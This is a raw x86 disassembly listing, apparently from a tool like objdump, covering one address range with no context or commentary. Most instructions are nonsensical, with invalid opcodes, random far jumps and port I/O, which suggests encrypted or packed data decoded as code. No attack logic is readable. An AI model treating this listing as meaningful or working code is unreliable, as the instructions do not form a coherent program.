  416a4f:	fcomp  QWORD PTR ds:0x404005bb
  416a55:	gs cdq 
  416a57:	enter  0xf8c4,0x81
  416a5b:	jbe    0x416a8c
  416a5d:	mov    WORD PTR [edi-0x19c83b89],fs
  416a63:	ins    BYTE PTR es:[edi],dx
  416a64:	inc    ebx
  416a65:	imul   ebp,DWORD PTR [ecx-0xc],0x7b
  416a69:	lahf   
  416a6a:	add    bl,BYTE PTR [ecx+0x19]
  416a6d:	out    dx,al
  416a6e:	pop    ebx
  416a6f:	push   esi
  416a70:	(bad)  
  416a71:	loope  0x416a86
  416a73:	cmp    ecx,ebx
  416a75:	frstor [ebx-0x73530314]
  416a7b:	cmp    dl,BYTE PTR [eax+ebx*4-0x17]
  416a7f:	std    
  416a80:	jnp    0x416ae2
  416a82:	in     eax,dx
  416a83:	lea    ebp,[ebx+0x5921d2b4]
  416a89:	jne    0x416a83
  416a8b:	push   0x6f080789
  416a90:	xchg   ebx,eax
  416a91:	dec    ecx
  416a92:	cli    
  416a93:	jns    0x416adf
  416a95:	add    eax,0x4c4d9868
  416a9a:	(bad)  
  416a9b:	fst    DWORD PTR [edx]
  416a9d:	dec    esi
  416a9e:	test   DWORD PTR [ebx],edi
  416aa0:	xchg   esi,esp
  416aa2:	pusha  
  416aa3:	inc    eax
  416aa4:	adc    DWORD PTR [ebp-0x8f12b1f],edi
  416aaa:	add    BYTE PTR [eax],0x9
  416aad:	test   BYTE PTR [eax-0x2],ch
  416ab0:	or     ebp,edi
  416ab2:	jg     0x416aca
  416ab4:	push   ebx
  416ab5:	enter  0x20c9,0xe
  416ab9:	clc    
  416aba:	mov    eax,edx
  416abc:	or     cl,dh
  416abe:	add    BYTE PTR [esi-0x25],dh
  416ac1:	sub    edx,DWORD PTR [edi-0x31]
  416ac4:	mov    BYTE PTR [edi-0x7a4b4696],ah
  416aca:	loop   0x416aa9
  416acc:	icebp  
  416acd:	jmp    0x681:0x9a3a63e7
  416ad4:	stos   BYTE PTR es:[edi],al
  416ad5:	mov    cl,0x58
  416ad7:	ja     0x416ab9
  416ad9:	mov    WORD PTR [ecx+0x3e],cs
  416adc:	(bad)  
  416add:	adc    ebp,DWORD PTR [edi]
  416adf:	add    bh,dh
  416ae1:	push   es
  416ae2:	loop   0x416b43
  416ae4:	jmp    0x416b06
  416ae6:	into   
  416ae7:	int    0x14
  416ae9:	inc    esp
  416aea:	js     0x416a88
  416aec:	inc    ebp
  416aed:	js     0x416a82
  416aef:	sub    BYTE PTR ds:0x1ddae6e3,dl
  416af5:	popa   
  416af6:	mov    ds:0x1e680a58,al
  416afb:	test   DWORD PTR [eax+edi*8-0x3c],ebp
  416aff:	arpl   WORD PTR [ebx-0x65],bp
  416b02:	ret    0xbb12
  416b05:	rcr    DWORD PTR [esp+edi*1+0x17ae9be7],1
  416b0c:	push   esp
  416b0d:	test   BYTE PTR [ebp-0x540c9a38],bh
  416b13:	js     0x416b2a
  416b15:	les    edx,FWORD PTR [ebx-0x2e]
  416b18:	cmp    al,0x72
  416b1a:	(bad)  
  416b1b:	les    eax,FWORD PTR [esi+0x10a5819c]
  416b21:	sbb    esp,DWORD PTR [esi-0x67eb1e3a]
  416b27:	je     0x416b1e
  416b29:	jae    0x416ace
  416b2b:	mov    esp,0xa3394dd0
  416b30:	ficomp WORD PTR [esi-0x21140042]
  416b36:	leave  
  416b37:	mov    bh,0xd4
  416b39:	and    edi,DWORD PTR [ebp-0x1f61def2]
  416b3f:	jecxz  0x416b2f
  416b41:	adc    DWORD PTR [esi+0x6e],ebp
  416b44:	dec    esp
  416b45:	jge    0x416af7
  416b47:	xchg   esp,eax
  416b48:	in     eax,dx
  416b49:	repz fbstp TBYTE PTR [esi+ebx*4+0x57]
  416b4e:	xchg   BYTE PTR [esp+eax*4-0x206df82b],bh
  416b55:	push   esi
  416b56:	jae    0x416aeb
  416b58:	push   ecx
  416b59:	ins    DWORD PTR es:[edi],dx
  416b5a:	mov    ah,0xe0
  416b5c:	pop    es
  416b5d:	sbb    esp,0x2dfc9f13
  416b63:	mov    eax,ds:0x58bf9a7b
  416b68:	out    dx,al
  416b69:	adc    DWORD PTR [ecx-0x4d310463],0x77
  416b70:	mov    ds:0xedbc1413,al
  416b75:	aaa    
  416b76:	int    0xde
  416b78:	jp     0x416b5f
  416b7a:	inc    eax
  416b7b:	sbb    DWORD PTR [edi-0x68],eax
  416b7e:	js     0x416b4f
  416b80:	daa    
  416b81:	or     al,BYTE PTR [ebx-0x69cf8a6c]
  416b87:	xor    ch,BYTE PTR [edx+0x56]
  416b8a:	out    0x2,al
  416b8c:	dec    ebx
  416b8d:	loope  0x416b1a
  416b8f:	and    eax,0x13e7978c
  416b94:	retf   0x1d8
  416b97:	jbe    0x416b4a
  416b99:	mov    bh,0x1c
  416b9b:	jns    0x416baf
  416b9d:	add    al,0x72
  416b9f:	push   edx
  416ba0:	xor    DWORD PTR [edx-0x697122e1],0x5b
  416ba7:	fcmovb st,st(0)
  416ba9:	sahf   
  416baa:	test   bh,dl
  416bac:	repnz push ecx
  416bae:	ret    0x991f
  416bb1:	out    dx,al
  416bb2:	jge    0x416bec
  416bb4:	sbb    bl,BYTE PTR [eax]
  416bb6:	adc    BYTE PTR [ebp+0x6a2a46d8],0x99
  416bbd:	adc    cl,0x1f
  416bc0:	frstor [ebx-0x79]
  416bc3:	push   ebx
  416bc4:	mov    bh,0xb5
  416bc6:	ins    BYTE PTR es:[edi],dx
  416bc7:	mov    eax,0x4c9c6279
  416bcc:	cwde   
  416bcd:	jecxz  0x416b97
  416bcf:	dec    ecx
  416bd0:	pusha  
  416bd1:	ror    al,1
  416bd3:	xlat   BYTE PTR ds:[ebx]
  416bd4:	sbb    al,0xfa
  416bd6:	xchg   BYTE PTR [edx-0xbc9a783],cl
  416bdc:	mov    ds:0xbbcb2dda,eax
  416be1:	scas   al,BYTE PTR es:[edi]
  416be2:	push   ds
  416be3:	cmp    dl,BYTE PTR [ebx+0x63]
  416be6:	sub    edx,ecx
  416be8:	stos   DWORD PTR es:[edi],eax
  416be9:	or     al,0xf5
  416beb:	xchg   ebp,eax
  416bec:	push   es
  416bed:	mov    al,ds:0x3b6a6de9
  416bf2:	cdq    
  416bf3:	adc    DWORD PTR [esi-0x2ca880f],edi
  416bf9:	dec    ebx
  416bfa:	inc    edx
  416bfb:	imul   esp,ecx,0x53
  416bfe:	fs xchg edi,eax
  416c00:	adc    edi,0xa0de43c0
  416c06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c07:	ror    DWORD PTR [ebp-0x647b1a21],0xa6
  416c0e:	(bad)  
  416c0f:	pop    ecx
  416c10:	mov    ah,BYTE PTR [ecx-0x4c]
  416c13:	push   edi
  416c14:	adc    al,0x5f
  416c16:	pusha  
  416c17:	cmp    DWORD PTR [edi+0x2e],edi
  416c1a:	xor    BYTE PTR [edi],bh
  416c1c:	add    esi,DWORD PTR [edi-0x47]
  416c1f:	jg     0x416c3d
  416c21:	inc    edx
  416c22:	adc    eax,0xb0830833
  416c27:	icebp  
  416c28:	inc    esi
  416c29:	pop    esi
  416c2a:	xlat   BYTE PTR ds:[ebx]
  416c2b:	and    eax,0x456db8cf
  416c30:	nop
  416c31:	jge    0x416c3a
  416c33:	aas    
  416c34:	xchg   ecx,eax
  416c35:	cwde   
  416c36:	jmp    0xfc53:0x7958845c
  416c3d:	out    0x36,al
  416c3f:	adc    DWORD PTR [edx],esp
  416c41:	adc    BYTE PTR [ecx+0x16],al
  416c44:	mov    al,cl
  416c46:	and    eax,0xc32cb569
  416c4b:	add    bh,ah
  416c4d:	loopne 0x416c55
  416c4f:	retf   
  416c50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c51:	xor    dl,BYTE PTR [ecx-0x29fc4136]
  416c57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c58:	mov    esi,edx
  416c5a:	mov    ah,0x39
  416c5c:	jecxz  0x416ca3
  416c5e:	inc    ebp
  416c5f:	arpl   WORD PTR [eax-0x2def1b59],cx
  416c65:	add    eax,0x40052794
  416c6a:	mov    bh,0x2a
  416c6c:	xchg   BYTE PTR [edi],bl
  416c6e:	mov    eax,0x9d03585f
  416c73:	rcr    DWORD PTR [esi+0x43],0x19
  416c77:	mov    ch,0xa5
  416c79:	inc    edi
  416c7a:	jb     0x416c6c
  416c7c:	or     cl,ah
  416c7e:	retf   0x38ce
  416c81:	sti    
  416c82:	mov    dl,0x82
  416c84:	test   BYTE PTR [ecx],dh
  416c86:	data16 shr BYTE PTR [edx-0x4e],0xb9
  416c8b:	xchg   esi,eax
  416c8c:	test   DWORD PTR [edx+0x27],eax
  416c8f:	div    BYTE PTR [eax+0x3c2d1e95]
  416c95:	xchg   edx,eax
  416c96:	inc    edi
  416c97:	and    DWORD PTR [edx-0x4b],0x5f
  416c9b:	outs   dx,DWORD PTR ds:[esi]
  416c9c:	ins    DWORD PTR es:[edi],dx
  416c9d:	jmp    0x1de7:0x9c67149b
  416ca4:	adc    esi,DWORD PTR [edi-0x2a7af7d1]
  416caa:	pop    ebx
  416cab:	push   edx
  416cac:	aad    0x78
  416cae:	sahf   
  416caf:	ds mov esp,0x8650584
  416cb5:	jmp    0x1a9fdb89
  416cba:	pop    esp
  416cbb:	ins    BYTE PTR es:[edi],dx
  416cbc:	pop    ds
  416cbd:	sbb    BYTE PTR [esi],ah
  416cbf:	icebp  
  416cc0:	popa   
  416cc1:	adc    esp,ecx
  416cc3:	add    eax,0x974c6e62
  416cc8:	in     eax,0x37
  416cca:	add    bl,cl
  416ccc:	into   
  416ccd:	aad    0xb4
  416ccf:	outs   dx,BYTE PTR ds:[esi]
  416cd0:	sbb    esi,DWORD PTR [edi+0x1ca45c99]
  416cd6:	jecxz  0x416c84
  416cd8:	push   edx
  416cd9:	push   ecx
  416cda:	push   eax
  416cdb:	jmp    0x416d42
  416cdd:	and    BYTE PTR [ebx+0x69],al
  416ce0:	and    cl,BYTE PTR [eax]
  416ce2:	fisttp QWORD PTR [ebp+esi*1-0x3ab6afd0]
  416ce9:	xchg   ecx,eax
  416cea:	xchg   edi,eax
  416ceb:	mov    esi,0xdf96d8ce
  416cf0:	mov    dl,0x52
  416cf2:	ds push ebx
  416cf4:	sub    al,0xd3
  416cf6:	xchg   esi,eax
  416cf7:	and    BYTE PTR [eax],ch
  416cf9:	xor    al,0x42
  416cfb:	sbb    cl,BYTE PTR [edx+ebx*4+0x23]
  416cff:	inc    esi
  416d00:	xor    DWORD PTR [eax],esp
  416d02:	jl     0x416ca1
  416d04:	pop    ss
  416d05:	fisttp DWORD PTR [ecx+ebx*8+0x29]
  416d09:	and    dh,dh
  416d0b:	dec    edx
  416d0c:	xor    eax,0x31e5c819
  416d11:	stos   DWORD PTR es:[edi],eax
  416d12:	std    
  416d13:	add    BYTE PTR [edi+0x24889570],dh
  416d19:	add    al,0x71
  416d1b:	enter  0xd551,0x4e
  416d1f:	adc    DWORD PTR [ebp-0x4f4055de],edi
  416d25:	les    esi,FWORD PTR [esp+edi*8]
  416d28:	inc    esi
  416d29:	or     DWORD PTR [ecx+esi*4],esp
  416d2c:	fsubrp st(3),st
  416d2e:	lods   al,BYTE PTR ds:[esi]
  416d2f:	shl    esi,cl
  416d31:	sbb    al,0xe2
  416d33:	shr    ebp,0x32
  416d36:	jne    0x416d0b
  416d38:	fstp   TBYTE PTR [eax-0x772a3d5a]
  416d3e:	xor    esi,DWORD PTR [esp-0x55e87b1e]
  416d45:	(bad)  
  416d46:	rol    BYTE PTR [eax+0x4faeb97f],cl
  416d4c:	sbb    DWORD PTR [ecx-0x4c8f8a62],0x66
  416d53:	inc    esp
  416d54:	add    esp,edx
  416d56:	mov    dl,0xee
  416d58:	cmp    bl,ch
  416d5a:	aam    0xab
  416d5c:	inc    ebp
  416d5d:	cmp    DWORD PTR [eax],0xffffffd5
  416d60:	push   ss
  416d61:	jle    0x416cff
  416d63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d64:	mov    eax,0x6a686a4e
  416d69:	push   eax
  416d6a:	jmp    0xa48b:0x1e5aa20a
  416d71:	or     ecx,DWORD PTR [esi+ebx*8+0x445ee69]
  416d78:	test   bh,bl
  416d7a:	push   ds
  416d7b:	add    DWORD PTR ds:0x37289541,edi
  416d81:	jmp    0x416db4
  416d83:	test   DWORD PTR [ecx-0x1f74bf1f],ebp
  416d89:	je     0x416dc5
  416d8b:	jp     0x416dc2
  416d8d:	shl    bh,cl
  416d8f:	mov    esp,0x736ad89b
  416d94:	in     al,0x17
  416d96:	ja     0x416d4b
  416d98:	scas   eax,DWORD PTR es:[edi]
  416d99:	enter  0xfdda,0x51
  416d9d:	sbb    eax,0x5ceecef8
  416da2:	mov    al,0x26
  416da4:	in     eax,dx
  416da5:	mov    dl,0xeb
  416da7:	mov    ebx,0x967f4628
  416dac:	and    eax,0x589edba3
  416db1:	rol    BYTE PTR [esi+0x4a152f03],cl
  416db7:	inc    BYTE PTR [edi]
  416db9:	aas    
  416dba:	mov    ?,WORD PTR [edx+eax*1]
  416dbd:	push   es
  416dbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dbf:	fsubp  st(2),st
  416dc1:	data16 mov al,cs:0xde8529ea
  416dc8:	fldenv [edx+eax*4+0x74]
  416dcc:	dec    ecx
  416dcd:	push   ds
  416dce:	mov    edx,es
  416dd0:	enter  0xfa07,0xd5
  416dd4:	and    BYTE PTR [edx+ecx*4+0x62],bh
  416dd8:	popf   
  416dd9:	in     eax,dx
  416dda:	pop    edi
  416ddb:	in     eax,dx
  416ddc:	jg     0x416db4
  416dde:	mov    bh,0x63
  416de0:	jmp    0x416e1c
  416de2:	out    0xc5,al
  416de4:	iret   
  416de5:	push   cs
  416de6:	adc    ch,dl
  416de8:	(bad)  
  416de9:	jae    0x416e3a
  416deb:	out    dx,al
  416dec:	xlat   BYTE PTR ds:[ebx]
  416ded:	jmp    0x416de4
  416def:	loopne 0x416db4
  416df1:	sbb    bh,BYTE PTR [ebx-0x3e11eb3e]
  416df7:	xchg   ebp,eax
  416df8:	loop   0x416d92
  416dfa:	aad    0x39
  416dfc:	cdq    
  416dfd:	scas   al,BYTE PTR es:[edi]
  416dfe:	(bad)  
  416dff:	js     0x416e50
  416e01:	std    
  416e02:	mov    edi,0x99f551b4
  416e07:	adc    al,0x3b
  416e09:	inc    ecx
  416e0a:	inc    ebp
  416e0b:	and    al,0x96
  416e0d:	xchg   ebp,eax
  416e0e:	call   0x1b75:0x5186a041
  416e15:	lods   eax,DWORD PTR ds:[esi]
  416e16:	xor    edi,DWORD PTR [eax]
  416e18:	mov    dl,0x29
  416e1a:	push   ebp
  416e1b:	popa   
  416e1c:	xchg   BYTE PTR [ebx+0x27],cl
  416e1f:	in     al,0xba
  416e21:	push   ecx
  416e22:	push   ss
  416e23:	int3   
  416e24:	and    BYTE PTR [eax-0x738d6bd1],ch
  416e2a:	add    DWORD PTR [edi+0x43],eax
  416e2d:	inc    ebx
  416e2e:	mov    ds:0x759e0e2,eax
  416e33:	jno    0x416dbb
  416e35:	test   BYTE PTR [edi+ebx*8-0x5d94fb8b],ch
  416e3c:	hlt    
  416e3d:	xchg   bh,cl
  416e3f:	out    0x23,al
  416e41:	jp     0x416e0f
  416e43:	push   cs
  416e44:	fwait
  416e45:	xor    al,0xd2
  416e47:	jbe    0x416e74
  416e49:	ins    DWORD PTR es:[edi],dx
  416e4a:	lds    edx,FWORD PTR [ebx-0x62fff777]
  416e50:	or     eax,0x4050389a
  416e55:	xchg   ebp,eax
  416e56:	imul   eax,DWORD PTR [esi+0x7b],0x35cf3d2b
  416e5d:	sub    al,0x1f
  416e5f:	xchg   esp,eax
  416e60:	jle    0x416e65
  416e62:	cs out 0x8d,al
  416e65:	mov    ds:0x633f6272,eax
  416e6a:	data16 and dh,bh
  416e6d:	cs mov ebp,0x3fbfb0a
  416e73:	sub    BYTE PTR [ebx+0x75],ah
  416e76:	(bad)
  416e7a:	mov    ds:0x352b43af,al
  416e7f:	dec    esp
  416e80:	jnp    0x416e3d
  416e82:	xor    eax,0x3bd53ff0
  416e87:	not    ebp
  416e89:	movhps xmm5,QWORD PTR [edi-0x46556b09]
  416e90:	mov    bh,0x8a
  416e92:	int3   
  416e93:	or     BYTE PTR [edi+0x35],dh
  416e96:	pop    ebx
  416e97:	fld    TBYTE PTR [edx-0x1a]
  416e9a:	les    edx,FWORD PTR ds:0x9fb51527
  416ea0:	xchg   ebp,eax
  416ea1:	mov    dl,BYTE PTR [ebx+0x50d54b8f]
  416ea7:	push   eax
  416ea8:	mov    eax,ds:0xe00db479
  416ead:	mov    edx,0x9573358b
  416eb2:	imul   edi,DWORD PTR [edx-0x53f035cd],0x450b02c8
  416ebc:	adc    cl,al
  416ebe:	jmp    0x886f7c5
  416ec3:	mov    eax,ecx
  416ec5:	or     eax,DWORD PTR [ebp+0x14]
  416ec8:	mov    ecx,DWORD PTR [ebx]
  416eca:	mov    edx,DWORD PTR [ebx+0x4]
  416ecd:	push   eax
  416ece:	push   DWORD PTR [ebp+0x8]
  416ed1:	jmp    0x41745b
  416ed6:	aaa    
  416ed7:	or     bl,BYTE PTR [ebp+0x2e982194]
  416edd:	js     0x416f43
  416edf:	stc    
  416ee0:	sub    al,0xb4
  416ee2:	out    dx,al
  416ee3:	aam    0xda
  416ee5:	je     0x416e98
  416ee7:	cdq    
  416ee8:	or     al,0x16
  416eea:	cmp    eax,0x72161604
  416eef:	cmp    bh,bh
  416ef1:	in     al,0x21
  416ef3:	repz arpl WORD PTR [ecx+0x69],si
  416ef7:	or     cl,dl
  416ef9:	jne    0x416eed
  416efb:	les    ebp,FWORD PTR [edi-0x6d5246da]
  416f01:	pop    esp
  416f02:	jbe    0x416f7e
  416f04:	dec    esp
  416f05:	xchg   BYTE PTR [esi-0x2957ce0b],ah
  416f0b:	cld    
  416f0c:	cmp    BYTE PTR ss:[edi+0x2324a710],bl
  416f13:	(bad)  
  416f14:	out    dx,eax
  416f15:	mov    ebp,0x5af0189a
  416f1a:	jp     0x416f0a
  416f1c:	inc    ebp
  416f1d:	mov    dh,0x91
  416f1f:	outs   dx,BYTE PTR ds:[esi]
  416f20:	cmp    DWORD PTR [esi-0x1f],edi
  416f23:	aas    
  416f24:	push   esi
  416f25:	mov    dl,BYTE PTR [ebx-0x30649810]
  416f2b:	jmp    0x7ab3:0xf724ec64
  416f32:	mov    bl,0x8
  416f34:	xor    eax,0xd2dbedee
  416f39:	mov    eax,ds:0xa83d78e4
  416f3e:	or     bh,bl
  416f40:	or     DWORD PTR [edx],ecx
  416f42:	outs   dx,BYTE PTR ds:[esi]
  416f43:	mov    ebp,0x71387f7
  416f48:	add    al,0x66
  416f4a:	mov    ebx,0x82c35e6e
  416f4f:	or     esp,eax
  416f51:	pop    ebp
  416f52:	iret   
  416f53:	pusha  
  416f54:	xor    eax,edi
  416f56:	out    0xec,eax
  416f58:	(bad)  
  416f59:	scas   al,BYTE PTR es:[edi]
  416f5a:	sub    BYTE PTR [eax+0x7c02d5a7],ch
  416f60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f61:	cmp    DWORD PTR [ebx+0x3a],eax
  416f64:	xor    ch,ch
  416f66:	pop    ss
  416f67:	pop    ebx
  416f68:	cmp    BYTE PTR [ebp-0x1f440087],ah
  416f6e:	shl    BYTE PTR [ebx-0x32],1
  416f71:	bound  ebx,QWORD PTR [edx-0x35]
  416f74:	adc    eax,0xe74721d0
  416f79:	adc    al,0xea
  416f7b:	push   esp
  416f7c:	dec    ecx
  416f7d:	pop    edi
  416f7e:	xor    ch,al
  416f80:	mov    BYTE PTR [esi+0x5f5eb9f3],bh
  416f86:	inc    edi
  416f87:	and    ecx,ebp
  416f89:	pop    eax
  416f8a:	out    0x1,al
  416f8c:	scas   eax,DWORD PTR es:[edi]
  416f8d:	push   edx
  416f8e:	xor    eax,0x706dffdb
  416f93:	pop    ebx
  416f94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f95:	sub    DWORD PTR [edx],edi
  416f97:	aaa    
  416f98:	mov    bl,0x65
  416f9a:	or     DWORD PTR [ebp-0x4ac93ed4],ebx
  416fa0:	data16 or ah,dh
  416fa3:	out    dx,eax
  416fa4:	and    BYTE PTR [ebx],bl
  416fa6:	mov    edi,0x646f8586
  416fab:	dec    ecx
  416fac:	lahf   
  416fad:	test   al,0x7f
  416faf:	dec    ebp
  416fb0:	in     eax,0x6c
  416fb2:	clc    
  416fb3:	(bad)  
  416fb4:	repnz dec ecx
  416fb6:	dec    ebx
  416fb7:	sub    edx,eax
  416fb9:	ins    DWORD PTR es:[edi],dx
  416fba:	sub    ebx,DWORD PTR [ebx]
  416fbc:	xor    BYTE PTR [ecx-0x12804aa2],ch
  416fc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fc3:	out    dx,eax
  416fc4:	cld    
  416fc5:	syscall 
  416fc7:	mov    dl,0xde
  416fc9:	cmp    al,BYTE PTR [edx-0x5c2d35c7]
  416fcf:	pop    eax
  416fd0:	push   esp
  416fd1:	pop    edx
  416fd2:	add    BYTE PTR [ebx-0x2086010a],0x46
  416fd9:	in     eax,0x7
  416fdb:	nop
  416fdc:	ret    0xde2d
  416fdf:	repnz xor BYTE PTR [ebp-0x3cc8d253],0xa4
  416fe7:	push   es
  416fe8:	pop    ds
  416fe9:	(bad)  
  416fea:	jmp    0xed352371
  416fef:	sub    BYTE PTR [esi],al
  416ff1:	add    DWORD PTR [ebp-0x3da35264],ebp
  416ff7:	cmp    ch,0xd
  416ffa:	fs xchg edi,eax
  416ffc:	lods   al,BYTE PTR ds:[esi]
  416ffd:	dec    ebp
  416ffe:	imul   esi,DWORD PTR [edi+0x63d5cd6c],0xffffffcb
  417005:	cmc    
  417006:	pop    eax
  417007:	icebp  
  417008:	ins    DWORD PTR es:[edi],dx
  417009:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41700a:	(bad)  
  41700b:	rcr    BYTE PTR [edx],cl
  41700d:	sub    al,0x70
  41700f:	push   0x6d3a234a
  417014:	jg     0x41708d
  417016:	cmp    ch,BYTE PTR [esp+ebp*1-0xf0bbddf]
  41701d:	jae    0x417084
  41701f:	mov    esp,0x52673b09
  417024:	push   esp
  417025:	adc    BYTE PTR [edx+0x8153d84],dh
  41702b:	or     al,0xd9
  41702d:	nop
  41702e:	popf   
  41702f:	adc    BYTE PTR [esi+0x77],ch
  417032:	pop    ds
  417033:	mov    dh,0xe6
  417035:	adc    al,0xe6
  417037:	jl     0x41704e
  417039:	es stc 
  41703b:	nop
  41703c:	push   ebx
  41703d:	mov    ds:0x35715b96,ax
  417043:	mov    ds:0xef8038ac,eax
  417048:	xchg   ebx,eax
  417049:	xchg   BYTE PTR [ebp-0x48],cl
  41704c:	mov    cl,0xd9
  41704e:	add    al,0xc1
  417050:	loopne 0x417059
  417052:	outs   dx,BYTE PTR ds:[esi]
  417053:	mov    ds:0x8c821aa4,eax
  417058:	retf   0x16d9
  41705b:	mov    ah,0x1c
  41705d:	out    dx,eax
  41705e:	mov    dh,BYTE PTR [ebx+0x26]
  417061:	xchg   BYTE PTR [ebx],dh
  417063:	les    ecx,FWORD PTR [edx]
  417065:	push   edx
  417066:	adc    BYTE PTR ds:0x1102e34d,0x86
  41706d:	pop    ebp
  41706e:	xor    DWORD PTR [edi+eax*4+0x60],edi
  417072:	jle    0x4170eb
  417074:	or     BYTE PTR [ebx-0x3e],0x14
  417078:	push   eax
  417079:	or     BYTE PTR [eax+0x1c],dl
  41707c:	mov    ebp,0x9f7d42d7
  417081:	aas    
  417082:	je     0x417083
  417084:	mov    cl,0x8d
  417086:	dec    ebx
  417087:	xlat   BYTE PTR ds:[ebx]
  417088:	aad    0x72
  41708a:	cmc    
  41708b:	scas   al,BYTE PTR es:[edi]
  41708c:	ss sbb eax,0x4020f471
  417092:	(bad)  
  417093:	jae    0x417057
  417095:	sar    DWORD PTR es:[edi+0x7b],1
  417099:	mov    al,ds:0x57a2fece
  41709e:	sahf   
  41709f:	stos   BYTE PTR es:[edi],al
  4170a0:	and    eax,0xb4f7046c
  4170a5:	imul   edi,DWORD PTR [edi],0xe943b6e2
  4170ab:	mov    ss,WORD PTR [ecx+0x467aaec0]
  4170b1:	push   ebx
  4170b2:	inc    ebp
  4170b3:	lea    edx,[eax-0x6c56cd24]
  4170b9:	xchg   ebp,eax
  4170ba:	push   ds
  4170bb:	jl     0x4170d8
  4170bd:	and    BYTE PTR [ebp+0x367be2c8],dl
  4170c3:	xchg   BYTE PTR [esi],ah
  4170c5:	mov    eax,ds:0x685c8565
  4170ca:	dec    edx
  4170cb:	cmc    
  4170cc:	and    DWORD PTR [esi],ebp
  4170ce:	cs pop ds
  4170d0:	pop    ebp
  4170d1:	je     0x4170c6
  4170d3:	int3   
  4170d4:	adc    DWORD PTR [eax-0x25],esp
  4170d7:	test   DWORD PTR [eax-0x26],0xa97c45d4
  4170de:	sti    
  4170df:	adc    BYTE PTR [ecx-0x74702c5a],bh
  4170e5:	ss dec ebx
  4170e7:	call   0x2c87:0x4f664cc8
  4170ee:	cmp    DWORD PTR ss:[ebp-0x75],0x489d96c4
  4170f6:	enter  0x2811,0xa3
  4170fa:	stos   BYTE PTR es:[edi],al
  4170fb:	mov    DWORD PTR [ebp-0x4],esi
  4170fe:	aad    0xe7
  417100:	gs clc 
  417102:	and    edx,edi
  417104:	out    dx,eax
  417105:	jmp    0x76e:0x35b357f3
  41710c:	nop
  41710d:	add    eax,DWORD PTR [edx]
  41710f:	arpl   WORD PTR ds:0x5ff66408,ax
  417115:	add    al,0x4
  417117:	and    BYTE PTR [edi],bh
  417119:	arpl   dx,dx
  41711b:	out    dx,al
  41711c:	jge    0x417132
  41711e:	inc    esi
  41711f:	adc    bh,ch
  417121:	sbb    BYTE PTR [ebx],bl
  417123:	sbb    ebp,ecx
  417125:	popa   
  417126:	stc    
  417127:	or     DWORD PTR [edx+0x3eddedff],0x4f
  41712e:	daa    
  41712f:	dec    ebx
  417130:	sub    BYTE PTR [esp+eiz*4],ah
  417133:	jge    0x417193
  417135:	adc    BYTE PTR [ecx+0x26f09988],cl
  41713b:	and    al,ch
  41713d:	or     bh,ah
  41713f:	mov    esp,0x7cf4bb80
  417144:	jl     0x4171a7
  417146:	aam    0xdd
  417148:	mov    ecx,0xba6276f8
  41714d:	xchg   esp,eax
  41714e:	fnstsw WORD PTR [edi-0x2343cde3]
  417154:	inc    edx
  417155:	or     BYTE PTR [eax+eax*1+0x16],ah
  417159:	sub    DWORD PTR [esi],esi
  41715b:	addr16 push esi
  41715d:	imul   esi,DWORD PTR [ecx-0x6d54680b],0xffffff90
  417164:	mov    edx,0xe358310
  417169:	(bad)  
  41716a:	xor    BYTE PTR [edi],cl
  41716c:	mov    eax,ds:0x1e47b683
  417171:	add    BYTE PTR [edx+ebx*8-0x2f],cl
  417175:	vpmulhuw ymm0,ymm3,ymm0
  417179:	mov    ch,0x17
  41717b:	or     bh,BYTE PTR [eax+ecx*4+0x8c9080e]
  417182:	outs   dx,DWORD PTR ds:[esi]
  417183:	mov    dl,0x88
  417185:	dec    ebx
  417186:	or     DWORD PTR [ebp-0x27],ebp
  417189:	aad    0xb5
  41718b:	push   ebx
  41718c:	fist   WORD PTR [edx-0x71]
  41718f:	popf   
  417190:	push   es
  417191:	ror    DWORD PTR fs:[ecx-0x75],1
  417195:	mov    ah,0x6f
  417197:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417198:	push   cs
  417199:	add    BYTE PTR [esi+0x49115e08],bh
  41719f:	adc    al,0x70
  4171a1:	sub    ebp,DWORD PTR [ebp+0x46d2625b]
  4171a7:	sbb    ecx,DWORD PTR [edi+0x1c]
  4171aa:	cmp    ebp,ebp
  4171ac:	and    DWORD PTR [eax-0x166a7dde],ebp
  4171b2:	in     al,0xdf
  4171b4:	es scas al,BYTE PTR es:[edi]
  4171b6:	ja     0x4171af
  4171b8:	add    BYTE PTR [ebp-0xc],al
  4171bb:	loope  0x417222
  4171bd:	mov    edx,0xfaefb3aa
  4171c2:	test   eax,0xb7f19bba
  4171c7:	lock push esi
  4171c9:	inc    esp
  4171ca:	mov    DWORD PTR [edx+0x174fb4c3],esi
  4171d0:	xlat   BYTE PTR ds:[ebx]
  4171d1:	stos   DWORD PTR es:[edi],eax
  4171d2:	pop    esi
  4171d3:	mov    dl,0x23
  4171d5:	scas   al,BYTE PTR es:[edi]
  4171d6:	adc    edx,eax
  4171d8:	sbb    al,0x2a
  4171da:	loopne 0x417201
  4171dc:	inc    ecx
  4171dd:	or     DWORD PTR [ecx-0x59763ded],esi
  4171e3:	fld    TBYTE PTR [ecx]
  4171e5:	and    al,0xfe
  4171e7:	jno    0x417220
  4171e9:	mov    eax,0xba340f3b
  4171ee:	mov    dh,0x29
  4171f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171f1:	lea    eax,[esp+ebx*1]
  4171f4:	ins    BYTE PTR es:[edi],dx
  4171f5:	aad    0x1c
  4171f7:	push   ss
  4171f8:	jb     0x41717f
  4171fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171fb:	icebp  
  4171fc:	mov    ebp,0xa13e6b70
  417201:	cmovo  esp,DWORD PTR [ecx]
  417204:	cs inc ebx
  417206:	pop    edi
  417207:	gs loope 0x41722d
  41720a:	int3   
  41720b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41720c:	scas   eax,DWORD PTR es:[edi]
  41720d:	jns    0x4171b5
  41720f:	in     eax,dx
  417210:	or     ecx,DWORD PTR [edi-0x13]
  417213:	push   ecx
  417214:	pop    esi
  417215:	push   ecx
